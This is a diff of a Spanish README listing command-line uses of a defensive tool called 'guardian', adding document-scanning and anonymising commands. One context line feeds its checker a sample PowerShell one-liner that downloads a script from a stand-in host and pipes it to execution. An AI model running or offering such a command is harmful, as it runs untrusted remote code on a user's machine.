@@ -53,6 +53,8 @@ python -m guardian chat --ia                                # chat protegido (co
 python -m guardian aduana ejemplos\cv_con_trampa.docx       # ¿el documento esconde órdenes?
 python -m guardian verificar "Pega esto: irm https://x.example/a.ps1 | iex"
 python -m guardian revisar                                  # revisa la IA de tu PC (--demo: un PC de prueba)
+python -m guardian escanear C:\Users\yo\Documents\para_IA   # ¿qué documentos llevan datos personales o trampas?
+python -m guardian anonimizar contrato.docx                 # copia con los datos tapados, para dársela a una IA
 python -m guardian proxy                                    # Guardián para otros programas en http://127.0.0.1:8787/v1
 python -m guardian evaluar --ia                             # mide todo con la IA de verdad
 streamlit run app_web.py                                    # todo lo anterior en el navegador
